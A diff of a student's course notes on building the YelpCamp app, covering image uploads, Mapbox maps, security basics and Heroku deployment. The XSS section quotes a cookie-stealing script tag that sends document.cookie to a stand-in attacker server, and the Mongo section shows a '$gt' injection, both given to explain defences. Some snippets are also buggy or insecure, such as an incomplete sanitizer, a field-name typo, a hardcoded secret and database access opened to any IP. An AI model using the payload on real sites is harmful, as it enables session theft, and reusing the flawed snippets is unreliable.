+ex. //pass in cloudinary to CloudinaryStorage
+ex. cloudinary.config({
+        cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
+        api_key: process.env.CLOUDINARY_KEY,
+        api_secret: process.env.CLOUDINARY_SECRET
+    });
+
+    const storage = new CloudinaryStorage({
+        cloudinary,
+        params: {
+          folder: 'YelpCamp',
+          allowedFormats: ['jepg', 'png', 'jpg']
+        }
+    });
+    //set up with our cloudinary account info
+    //an instance of Cloudinary stroage
+    //"folder" inside Cloudinary
+
+    module.exports = {
+
+        cloudinary,
+        storage
+        
+    }
+
+- in campgrounds.js,
+
+ex. const {storage} = require('../cloudinary')
+
+ex. const upload =multer({storage});
+
+<br>
+
+
+
+
+
+
+
+#### 530. Storing Uploaded Image Links In Mongo
+- better to save both **path** and **filename** 
+~> path to retrieve the image
+~> filename in case user wants to delete!
+
+- in campgrounds.js,
+ex. const CampgroundSchema = new Schema ({
+        ...,
+        images: [
+          {
+            url: String,
+            filename: String
+          }
+        ]
+    })
+
+- in routes > campgrounds.js,
+ex. module.exports.createcampground = (async (req, res) => {
+    const campground = new Campground(req.body.campground);
+    campground.images =req.files.map(f => ({url: f.path, filename:f.filename}))
+    ..
+    }
+
+  //map over the array added to req.files thanks to multer to make array of objects, add them to campground, then save
+
+
+
+
+
+
+- schemas.js ~> remove'image'requirements
+
+<br>
+
+
+
+
+
+
+
+#### 531. Displaying Images In A Carousel
+- Bootstrap > Carousel!
+
+ex. <div id="campgroundCarousel" class="carousel slide" data-bs-ride="carousel">
+            <div class="carousel-inner">
+                <% campground.images.forEach((img, index) => {%>
+                <div class="carousel-item <%= index === 0? 'active': ''%>"> 
+                    <img src="<%= img.url%>" class="d-block w-100" alt="">
+                </div>
+                <% }) %>
+            </div>
+            <% if (campground.images.length>1){ %> 
+            <a class="carousel-control-prev" href="#campgroundCarousel" role="button" data-bs-slide="prev">
+            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+            <span class="visually-hidden">Previous</span>
+            </a>
+            <a class="carousel-control-next" href="#campgroundCarousel" role="button" data-bs-slide="next">
+            <span class="carousel-control-next-icon" aria-hidden="true"></span>
+            <span class="visually-hidden">Next</span>
+            </a>
+            <% } %>
+
+      </div>
+
+
+- and there are lots of other things you can display with Cloudinary!
+~> ex. compress images
+~> ex. create thumbnails
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+#### 532. Fixing Seeds
+- modify the seeds.js file so that the campground has image's' objects
+
+- ex. node seeds/index
+
+- fix index.ejs
+
+<Br>
+
+#### 533. Adding Uploads To Edit Page
+
+- Edit page!
+~> will do excatly the same thing
+
+- enctype, input type ='file'
+
+- routes > campgrounds.js
+~> .put(..,upload.array("image"))
+
+- controllers > campgrounds.js,
+ex. const imgs = campground.images =req.files.map(f => ({url: f.path, filename:f.filename}))
+    campground.images.push(...imgs)
+
+  //push on, not overwriting all
+  //the data in array, not the array itself using the spread operator...!!
+
+<br>
+
+
+
+
+
+
+
+
+#### 534. Customizing File Input
+- Bootstrap > Form Controls > File input
+
+- in the previous BS version4, **bs-custom-file-input** library was required to show the selected files
+: to add JS functionality
+
+- for the previous version..
+1. add CDN to boilerplate
+ex. https://cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js
+
+2. in validateForms.js, ex. bsCustomFileInput.init()
+
+3. in new.ejs, add .custom-file and .custom-file-label to match the codes in  that library!
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#### 535. A Word of Warning!
+- think about
+
+~> limiting # of images that a user can upload
+: either on client- or server- side!
+~> limiting the max. size of an image
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+#### 536. Deleting Images Form
+- let's update the edit form so that the user can see the currently uploaded images and delete some of they if they want
+
+- in edit.js,
+ex. <div class = "mb-3">
+      <% campground.images.forEach(function(img, index) {%>
+        <img src="<%=img.url %>" class ="img-thumbnail" alt="">
+        <div class = "form-check-inline">
+          <input type="checkbox" id="image-<%=index%>"name="deleteImages[]"value= "<%=img.filename%>">
+          </div>
+          <label for="image-<%=index%>">Delete? </label>
+
+          <%})%>
+
+
+
+
+
+
+
+
+- schemas.js,
+ex. module.exports.campgroundSchema = Joi.object({
+      campground: Joi.object({
+          title: Joi.string().required(),
+          price: Joi.number().required().min(0),
+          // images: Joi.string().required(),
+          location: Joi.string().required(),
+          description: Joi.string().required() 
+
+      }).required(),
+      deleteImages: Joi.array()
+    }));
+
+
+- when you check the checkboxes, the chcked image filenames are stores inside the array deleteImages[]
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#### 537. Deleting Images Backend
+- in controllers > campgrounds.js
+
+ex. const  {cloudinary}=require('../cloudinary')
+ex. module.exports.updateCampground = async(req,res)=>{
+        ...
+        if(req.body.deletImages){
+          for (let filename of req.body.deleteImages){
+            await cloudinary.uploader.destroy(filename)
+          }
+          await campground.updateOne({$pull: {images: {filename: {$in: req.body.deleteImages}}}})
+          //console.log(campground)
+        } 
+
+        ...
+    }
+
+    //want to delete images that are in the array deleteImages, from the array images
+
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#### 538. Adding a THumbnail  Virtual Property
+- to cap size of displayed images, we can use CSS and other stuff!
+~> but will take a lot of time and doesn't really make sens to just crop random parts out of images
+=> instead, let's use the Cloudinary functionality!
+
+- cloudinary.com/documentation/image_tranformation_reference
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+- Image Transformation API reference
+:https://res.cloudinary.com/<cloud_name>/<asset_type>/<delivery_type>/<transformations>/<version>/<public_id_full_path>.<extension>
+
+ex. res.cloudinary.com/dlhgkcxol/image/upload/w_100/v###/YelpCamp/###.jpg
+~> thumbail image with width = 100 px !!
+
+- in model>campgrounds.js
+: let's set up a virtual property!!
+
+- we want the modified url of **each Image** in each campground, so let's set up an ImageSchema separate from CampgroundSchema as well
+
+~> just to use, not to import
+
+ex.const ImageSchema = new Schema({
+    url: String,
+    filename: String
+})
+
+
+ImageSchema.virtual('thumbnail').get(function() {
+    return this.url.replace('/upload','/upload/w_200')
+})
+const CampgroundSchema = new Schema({
+    title: String,
+    images: [ImageSchema],...})
+
+- the reason why we are using virtual property is that, we do not need to actually store this property! we're just deriving from information we already stored!(ex.url)
+
+- in edit.ejs,
+ex. <%= img.thumbnail%>
+
+<br>
+
+
+## 55. YelpCamp: Adding Map
+
+#### 539. Registering For Mapbox
+- mapbox.com
+~> very popular among developers
+
+- 'geocode'
+
+- once signed in,
+~> Tokens
+~> these tokens are NOT secrets 
+~> mapping libraries happen via JS on client-side in the browser!
+
+~> public token is enough for now for our purpose
+
+~> copy & paste to .env file!
+
+- in .env,
+ex. MAPBOX_TOKEN=
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#### 540. Geocoding Our Locations
+- there r lots of geocoding apis
+~> we will use mapbox geocoding api!
+
+:docs.mapbox.com/api/search/#geocoding
+~> we can use 'forward geocoding', requesting manually using endpoints
+
+~> but we'll instead use the Mapbox Node Client [Mapbox SDK]
+
+ex. npm install @mapbox/mapbox-sdk
+ex. github.com/mapbox/mapbox-sdk-js 
+
+~> a lot of functionalities, while what we're interested in is *forwardGeocode*
+
+- in controllers > campgrounds.js,
+
+ex. const mbxGeocoding = require("@mapbox/mapbox-sdk/services/geocoding")
+    //among multiple services require only what you neeed!
+
+
+ex. const mapBoxToken = process.env.MAPBOX_TOKEN;
+ex. const geocoder = mbxGeocoding({accessToken: mapBoxToken})
+
+ex. module.exports.createCampground = async(req, res, next) =>{
+
+      ...
+
+      const geoData=await geocoder.forwardGeocode({
+        query: req.body.campground.location,
+        limit:1
+      }).send()
+
+      res.send( geoData.body.features[0].geometry .coordinates)
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<Br>
+
+
+#### 541. Working With GeoJSON
+- Store the coordinates information we get from Mapbox into the campground model!!
+
+- we COULD store lat, long as numbers
+
+~> but instead we will store GeoJSON
+
+
+- GeoJSON : standard
+ex. {"type": "Point", "coordinates": [-90.73333, 14.56667]}
+
+- Mongoose docs
+: mongoosejs.com/docs/geojson.html
+
+ex. in models>campgrounds
+        ...,
+        geometry: {
+          type: {
+            type: String,
+            enum: ["Point"],
+            required: true
+          } ,
+          coordinates:{
+            type: [Number],
+            required: true
+          }
+          ...
+        }
+})
+
+- mongo itself supports GeoJSON
+~> docs.mongodb.com/manual/geospatial-queries
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+- controllers>campgrounds,
+
+ex. module.exports.createCampground = ...{
+  
+      ...
+      campground.geometry = geoData.body.features[0].geometry;
+      ..
+    }
+
+
+
+
+
+    
+
+
+
+<Br>
+
+#### 542. Displaying A Map
+- docs.mapbox.com/mapbox-gl-js/api/
+
+- you can customize the map too!
+
+- in boilerplate,
+ex. <script src='https://api.mapbox.com/mapbox-gl-js/v2.1.0/mapbox-gl.js'></script>
+ex.<link href='https://api.mapbox.com/mapbox-gl-js/v2.1.0/mapbox-gl.css' rel='stylesheet' />
+
+~> in real world, we don't want to load maps in every single page so not the best place to include these CDNs
+
+- show.ejs,
+ex. <div id='map' style='width: 400px; height: 300px;'></div>
+
+- public>javascripts>showPageMap.js
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ex. 
+    <script>
+          //TO MAKE THE MAP APPEAR U MUST
+          //ADD YOUR ACCESS TOKEN FROM
+          //https://account.mapbox.com
+          mapboxgl.accessToken = '<%- process.env.MAPBOX_TOKEN%>';
+
+          const map = new mapboxgl.Map({ 
+            container: 'map',
+            style: 'mapbox://styles/mapbox/streets-v11', //stylesheet location
+            center:[-74.5,40], //starting position
+            zoom:9 //starting zoom
+          })
+
+      </script>
+
+  
+- at the end of show.ejs
+ex. <script src = "/javascripts/showPageMap.js">
+
+- and to give access to <%-process.env.MAPBOX_TOKEN%>,
+
+~> show.ejs
+ex. <script>
+      const mapToken = '<%- process.env.MAPBOX_TOKEN%>'
+    </script>
+
+~> then change in showPageMap as
+ex. mapboxgl.accessToken = mapToken
+
+<br>
+
+
+
+
+
+
+
+#### 543. Centering The Map On A Campground
+- let's talk about how to add a marker to the map!
+~> refer to the Mapbox Docs!
+
+- in showPageMap
+ex. new mapboxgl.Marker()
+    .setLngLat ([###,##])
+    .addTo(map)
+
+
+- another way of doing it
+~> could make an API endpoint that we request with AJAX over showPageMap
+~> so once our code loads  in the browser, then it will make a request back to the server and say
+~> "hey, give me the campground information, we will make a map"
+
+- in our way,
+ex. in show.ejs
+ex. <script>
+        const mapToken = "<%- process.env.MAPBOX_TOKEN%>"
+        const campground = "<%-JSON.stringify(campground)%>" 
+
+  //set a campground variable so that we can access it immediately on the client-side
+
+- in showPageMap,
+ex. const map = new mapboxgl.Map({
+        ...,
+        center: campground.geometry.coordinates
+})
+
+<Br>
+
+#### 544. Fixing Our Seeds Bug
+- in index.ejs
+ex.  <%if (campground.images.length){%>
+      <img class="img-fluid" alt="" src="<%=campground.images[0].url %>" 
+      <% } else {%>
+      <img class = "img-fluid" alt="" src="default">
+      <%}%>
+
+
+<br>
+
+
+#### 545. Customizing Map Popup
+- you can add a popup when you click marker
+
+- Mapbox Docs - Popup
+
+ex. new mapboxgl.Marker()
+      .setLngLat(campground.geometry.coordinates)
+      .setPopup(
+        new mapboxgl.Popup ({offset: 25})
+        .setHTML(
+          `<h3>${campground.title}</h3>  <p>${campground.location}</p>`
+        )
+      )
+      .addTo(map)
+
+  
+<br>
+
+
+
+
+
+
+
+
+
+
+#### 546. Intro To Our Cluster Map
+- web development :about refering to the docs and modifying as needed!
+
+<br>
+
+
+#### 547. Adding Earthquake Cluster Map
+- docs.mapbox.com/mapbox-gl-js/ example/cluster
+
+~> copy and paste the starter code
+~> then edit as required!(public>javascripts>clusterMap!)
+
+- in index.ejs
+ex. <div id= "map"style="width: 100%;height: 500px"></div>
+
+ex. <script>
+        const mapToken =  "<%-process.env.MAPBOX_TOKEN%>"
+        const campground = <%- JSON.stringify(campground)%>
+      </script>
+
+
+  
+<br>
+
+
+
+#### 548. Reseeding Our Database! (again)
+- NOTE. ALWAYS good to check console for errors
+
+- in seeds>index.js
+ex. ...
+    geometry : {
+      type: 'Point',
+      coordinates: [cities[random1000].longitude,cities[random1000].latitude]
+    },
+    ...
+
+
+    
+
+
+
+
+
+<br>
+
+
+
+
+
+#### 549. Basic Clustering Campgrounds
+- clusterMap
+
+- where the data loads
+~> map.addsource(... data:)
+
+- index.ejs,
+ex. <script>
+      ...
+      const campgrounds = {features:<%- JSON.stringify(campgrounds)%>}
+      //{features:...}
+      //to match format
+    </script>
+
+
+<br>
+
+
+
+
+
+
+
+
+#### 550. Tweaking Clustering Code!
+- earthquake => campground
+
+- going over codes
+
+<br>
+
+
+
+
+
+#### 551. Changing Cluster Size and Color
+- seed again with 300 campgrounds
+
+
+
+
+
+
+- change few stuff in clusterMap
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#### 552. Adding Custom Popups
+- clusterMap
+ex. map.on('click'..){
+      new mapboxgl.Popup()
+        . ..
+        .setHTML (
+          
+            '<h3>Campground</h3>'
+        )
+
+- we need to get info of the clicked campground, and show that in the pop-up!
+
+- original EQ code uses sth like e.features[0]
+~> ours does NOT follow the expected GeoJSON format
+~> and is empty
+
+~> let's create a **virtual property**!
+~> while it does not need to be virtual 
+=> which can lead users to the specific showpage of each camp!
+
+
+- in models>campgroudns
+ex. CampgroundSchema.virtual('properties.popUpMarkup').get(function () {
+        
+        return `<a  href="/campgrounds/${this._id}">${this.title}</a>`
+})
+
+    //properties.popUpMarkup ~> to nest!
+
+
+- BUT PROBLEM!
+~> Mongoose Docs,'Virtuals in JSON'
+
+=>By default, Mongoose does not include virtuals when you convert a document to JSON! For example, if you pass a document to Express' res.json() function, virtuals will not be included by default. To include virtuals in res.json(),you need to set the toJSON schema option -> {virtuals:true}
+
+- then in clusterMap
+ex. const {popUpMarkup}=e.features[0].properties 
+
+- index.ejs
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+## 57. YelpCamp: Styles CleanUP
+
+
+
+#### 553. Styling HOme Page
+- boost through styling!
+
+- home.ejs,home.css
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+#### 554. Additional Home Page Styling!
+- add a bg image to the body!
+ex. body {
+        background-image: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)),
+        url("..."),
+        background-size: cover;
+        background-position: center;
+    }
+    //adding two bg images - gradient and the actual image
+
+
+ex. .nav-link {
+        padding: 0.25rem 0;
+        font-weight: 700;
+        color: rgba(255, 255, 255, 0.5);
+        margin-left: 1rem;
+
+        border-bottom: 0.25rem solid transparent;
+
+        text-shadow: 0 0.05rem 0.1rem rgba(0,0,0,0.5);
+        box-shadow:inset 0 0 5rem rgba(0,0,0,0.5)
+    }
+
+    .nav-link:hover{
+
+        color: rgba(255,255,255,0.5)
+        border-bottom-color: rgba(255,255,255,0.5)
+    }
+    .btn-secondary, .btn-secondary:hover{}
+    .nav-link.active{}
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#### 555. Styling Login FORM!
+- LogIn FORM to Card
+
+- login.ejs
+: grid, card, autofocus
+
+<Br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#### 556. Styling Register FORM!
+- duplicate the same styling to REGISTER
+
+- responsive (md)columns to NEW &  EDIT
+
+<br>
+
+
+
+
+
+#### 557. Spacing CampGrounds
+
+- .mb-3
+
+<Br>
+
+
+#### 558. Removing Inline Map Styles
+- index.ejs and show.ejs
+~> style="width: 100%; height: 300px;" for map
+
+- public>stylesheets>app.css =>include in boilerplate!
+
+- public>javascripts>clusterMap.js=>modify ID to match!
+
+<Br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#### 559. Map Controls
+- zoom-in / zoom-out / rotate
+
+- Mapbox Docs - Examples
+
+
+: Search Controls
+
+
+
+
+~> diaply map navigation controls
+
+
+ex. map.addControl (new mapboxgl.NavigationControl());
+
+~> more on NavigationControl
+
+ex. map.addControl(nav,'pos');//where to ADD
+
+<br>
+
+
+
+
+
+
+
+
+
+
+## 58. YelpCamp: Common Security Issues
+
+
+
+
+
+
+
+
+
+
+#### 560. Mongo Injection
+- Security itself is a VERY BIG field!
+~> we will only touch a part of it
+
+- "SQL Injection"
+~> in our case, no-SQL, "Mongo Injection"
+
+ex. db.users.find({usrname: req.body.usrname})
+~> if the user enters something like
+~> ex.db.users.find(usrname:{"$gt: ""})
+
+=> the most basic way to prevent Mongo Injection is..
+~> not allowing uses of $, ., etc
+
+- Express Mongoose Sanitize Package!
+
+
+: npmjs.com/packages/express-mongo-sanitize
+
+
+- ex. npm i express-mongo-sanitize
+
+- in app.js
+ex. const mongoSanitize = require ('express-mongo-sanitize')
+ex. app.use(mongoSanitize({
+      //replaceWith: '_'
+    }))
+
+~> does not allow those problematic special characters in queries, params, and req.body!
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#### 561. Cross Site Scripting (XSS)
+- ex. xss-game.appspot.com
+
+- one interesting example - cookies!
+~> most of websites will allow document.cookies
+~> and when we enter the following as the query string
+
+ex. <script>new Image().src="mybadserver/hacker?output="+document.cookie; </script>
+//taking that cookie and sending info to bad server!
+//whenever you set a source to an image, the browser sends a request => so it is one way of sending a request!
+- so when this kind of thing is sent to random users in a form of url, and when users click the link their info are sent
+
+- XSS Filter Evasion Cheat Sheet
+
+- Certificates
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#### 562. Sanitizing HTML w/ Joi
+- ex. <h1>HELLO</h1> for campground title does not work!
+~> as <%=%> is HTML-escaped!
+
+~> but!!! HTML-unescaped <%- %> tag is used for the map popup!
+~> gotta fix it!
+
+- possible XSS
+
+- Joi doesn't provide a sanitizing tool!
+
+- NOTE. 'express-validator' does the same thing as Joi!
+~> Colt didn't use it because of the complicated syntax!!
+
+- so let's use our own version on top of Joi!
+
+- npm install sznitize-html
+
+- in schemas.js
+
+
+
+
+
+ex. const BaseJoi = require ('Joi')
+
+ex. const extension = (joi) => ({
+      type: 'string',
+      base: joi.string(),
+      messages: {
+          'string.escapeHTML': '{{#label}} must not include HTML!'
+      },
+      rules: {
+          escapeHTML: {
+              validate(value, helpers){
+                  allowedTags: [],
+                  allowedAttributes: {},
+              });
+              if (clean !== value) return helpers.error('string.escapeHTML',{value})
+              return clean;
+          }
+      }
+    });
+
+    
+
+ex. const Joi =BaseJoi.extend(extension)
+
+~> then apply this extension (sanitizeHTML) wherever String's type
+
+<br>
+
+
+
+
+
+
+#### 563. Minor Changes to Session/Cookies
+- in app.js,
+ex. const sessionConfig = {
+        ...,
+        cookie: {
+            name:'session'
+            httpOnly: true,//cookies not available via JS
+            secure: true//cookies only provided over https
+            ...
+        },
+        ...
+    }
+
+
+    
+
+    => while localhost is not a secure one!
+    =>specific given name is better than the default-connect.sid
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br>
+
+
+
+
+
+
+
+
+
+
+#### 564. Hiding Errors
+- we don't want to show the 'error stack' to users
+
+- in error.ejs,
+
+ex. ...
+    <h4 class = "alert-heading"><%=err.message%></h4>
+    <% if (process.env.NODE_ENV !== "production"){%>
+    <p><%=err.stack%></p>
+    <% } %>
+    ...
+
+- and when you run,
+ex. NODE_ENV= production node app.js
+
+
+
+
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+#### 565. Using Helmet
+- helmetjs.github.io
+
+~> 11 middlewares regarding HTTP headers
+
+~> docs is great!
+
+ex. npm install helmet
+
+- in app.js,
+ex. const helmet = require ('helmet')
+
+ex. app.use(helmet)
+    
+    //all 11 middlewares would automatically run
+
+    
+~> but problem!
+~> Contents Security Policy : blocks links! =>let's disable it for now
+
+ex. app.use(helmet({  contentSecurityPolicy: false  }))
+=> with helmet, the header is different
+
+<br>
+
+
+
+
+
+
+
+
+
+
+#### 566. Content Security Policy Fun
+
+- Under Helmet,
+~> helmets.github.io: "helmet.contentSecurityPolicy" sets the "Content-Security-Policy" header which helps mitigate cross-site scripting attacks, among other things.
+~> MDN: Content Security POlicy (CSP) : is an added layer of security that helps to detect and mitigate certain types of attackes, including XSS and data injection attacks.
+: about 'designating' your own policy on what's acceptable and what is not
+
+=> about sources to allow!
+
+: refer to app.js!
+
+- while...  REMEMBER that we learned just a little little bit of what's needed
+
+<br>
+
+
+
+
+
+## 59. YelpCamp: Deploying
+#### 567. Setting Up MongoAtlas
+- currenlty all the data is stored in the local database 'yelp-camp'
+
+- we need to have a production database! and most of the cases we also want to keep a development database for testing improvement
+
+- Mongo Atlas
+: cloud-database services
+: paid product of Mongo DB
+
+~> create a new mongo databse that we do not store on our machine
+~> then we can connect to it easily
+~> makes it very easy to manage permission, securities, GUI, etc.
+~> used a lot in the real world!
+
+~> db itself is just like a mongodb so we do not need to change any
+
+- mongodb.com/cloud/atlas
+=> sign up
+
+
+
+
+- Connect To Atlas
+1. Build your first cluster
+2. Create your first database user
+3. Add IP Address to your Access List
+4. Load Sample Data (Optional)
+5. Conncet to your cluster
+
+- 'Database User'
+~> with differnt permission, etc
+~> follow the Steps!
+
+
+=> 'our-first-user', autogenerated secure password
+
+
+- Whitelist IP Address
+: Approving the ip address which we can access the db with
+
+=> network access !!
+
+- Connect to the cluster!
+=> Click "Connect" !!
+
+~> Clusters
+~> Connect your app
+
+~> copy the URL
+
+~> in .env, paste the URL, setting
+ex. DB_URL = ... (with password being the actual passowrd)
+
+
+- if everything went well, we should be able to access the DB_URL
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+const dbUrl = process.env.DB_URL
+- in app.js
+
+ex. mongoose.connect(dbUrl,...)
+
+~> in Atlas, we can see the database
+
+- for now, we can use the development one
+
+<br>
+
+
+
+
+
+
+#### 568. using Mongo for Our Session store
+- NOTE. default storage location for Express Session is memory store!
+
+~> does not scale well, so we will use mongo instead
+
+- "Connect-Mongo"
+~> npmjs.com/package/connect-mongo 
+~> mongoDB session store for Connect and Mongo
+~> ex. npm install connect-mongo
+
+- in app.js
+ex. const MongoDBStore = require('connect-mongo') (session);
+
+~> then right before sessionCongif,
+ex. const store = new MongoDBStore ({
+        url:dbUrl,
+        secret: 'thisshouldbeabettersecret!',
+        touchAfter: 24 * 60 * 60 //in seconds,24 hours, resave only after this time unless there has been change
+    });
+
+
+  
+
+ex. store.on("error", function(e){
+        console.log("SESSION STORE ERROR", e)
+    });
+
+~> and modify
+ex. const dbUrl = 'mongodb://localhost:27017/yelp-camp'
+ex. mongoose.connect(dbUrl, ..)
+
+
+~> and in sessionconfig
+ex. const sessionConfig = {
+        store: store, //or just store
+      ..
+    }
+
+
+- Now in Mongo,
+ex. show collections
+ex. db.sessions.find({})!
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#### 569. Heroku Setup
+
+- One of many similar app-serving/saving/hosting platform tools!
+- End goal: our app to run on Heroku's machine
+~> still, there are settings to configure / change!
+
+~> need to install node packages, etc.
+
+- Heroku.Com
+~> register!
+~> download the Heroku CLI!
+
+=> how we'll get our codes to be up and runningon Heroku!
+
+~> follow the instruction
+
+- Log In to Heroku
+~> with our command line client
+
+- in Git Bash,
+: YelpCamp
+: heroku login
+
+: hit any key
+
+: a browser will open for us to log in!
+
+<br>
+
+
+
+
+
+
+#### 570. Pushing To Heroku
+
+- after logging into Heroku on the terminal,
+ex. git init
+ex. heroku create
+
+=> make a new spot for us
+=> url made
+
+=> will use this!
+
+: with that url we can access the space where our app will be deployed
+
+
+ex. https://salty-garden-48916.herokuapp.com
+
+
+- before we deploy, let's make some edits to our app
+
+- in app.js
+ex. const dbUrl = process.env.DB_URL ||  "mongodb://localhost:27017/yelp-camp"
+
+ex. const secret = process.env.SECRET || 'thisshouldbeabettersecret'
+
+- make a file called .gitignore
+ex. node_modules
+ex. .env
+
+- now deploy!
+
+: in the terminal
+
+ex. git remote -v
+
+ex. git add . //add everything
+ex. git commit -m "ready to try deploying" //commit everything
+
+ex. git push heroku master
+
+
+
+
+
+
+- CF.https://www.udemy.com/course/the-web-developer-bootcamp/learn/lecture/22361220#questions/13078722
+
+- but it doesn't work yet!
+
+<br>
+
+
+
+
+
+#### 571. Fixing Heroku Error
+
+- to see the error message logs,
+
+
+
+~> heroku logs --tail
+
+1. Heroku does not know how to start our app!
+: so in package.json,
+ex. "scripts": {
+        ..,
+        "start": "node app.js"
+    }
+
+: "name" should be all lowercase
+
+2. Change the port
+: in app.js
+ex. const port = process.env.PORT || 3000
+    //port # saved on Heroku!
+ex. app.listen(port, ...)
+
+: anytime we make changes, we should git add . and git commit -m "add start script! "
+
+- still not working!
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+#### 572. Configuring Heroku Env Variables
+- we gotta configure env variables!
+
+1. FIRST WAY
+- in Heroku website,
+: specific app
+: settings
+: config vars
+: then enter variables!
+
+2. IN CLI
+
+- heroku config: set SECRET = ...
+
+
+
+
+
+: do this again
+
+
+- still not working!
+
+: we have to whitelist the IP accessing MongoDB Atlas
+
+- back to MongoDB Atlas setting
+: Access
+: Add ip access list entry
+: All access from anywhere!
+
+
+- then heroku restart!
+
+- after fixing all errors,
+: THE APP IS FINALLY UP AND RUNNING!!! :D :D
+
+- can "seed " the campgrounds if you want
+
+(https://www.udemy.com/course/the-web-developer-bootcamp/learn/lecture/22361242#questions/13704006)
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
